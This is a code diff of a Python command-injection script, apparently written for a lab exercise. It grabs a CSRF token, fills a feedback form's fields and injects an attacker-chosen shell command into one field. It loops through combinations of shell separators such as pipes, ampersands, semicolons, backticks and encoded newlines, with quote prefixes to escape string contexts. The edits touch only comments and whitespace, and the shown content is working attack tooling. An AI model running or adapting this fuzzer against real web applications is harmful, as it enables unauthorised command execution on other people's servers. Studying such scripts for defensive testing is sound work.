@@ -13,8 +13,7 @@ def get_csrf_token(session):
     csrf_token = re.search(r'name="csrf" value="(.*)"', resp.text).group(1)
     return csrf_token
 
-
-# First get web page for csrf_token, then inject the code through a post request
+# Inject the command through a post request
 def poster(session, csrf_token, form_url, attack_field, command, prefix, suffix):
     dummy_str = 'bah'
     fields = dict.fromkeys(['name','subject','message','email'], dummy_str) # setting initial field values
@@ -28,7 +27,6 @@ def poster(session, csrf_token, form_url, attack_field, command, prefix, suffix)
     resp = session.post(form_url+"/submit", data=data)
     print("Response: " + resp.text)
 
-
 # Getting command line args
 form_url=sys.argv[1]
 attack_field=sys.argv[2] # E.g. email
@@ -39,9 +37,8 @@ print("Command", cmd)
 payload = ['|', '||', '&', '&&', ';', '%0a', '#', '`', '\n']
 start_str = ['', '\'', '"'] # In case the field we are attacking is fed into a string, we must first terminate the string before executing our command
 
-sess = requests.Session()
+sess = requests.Session() # Create session for reuse
 csrf = get_csrf_token(sess)
-
 
 for start in start_str:
     for subset in itertools.combinations_with_replacement(payload, 2):
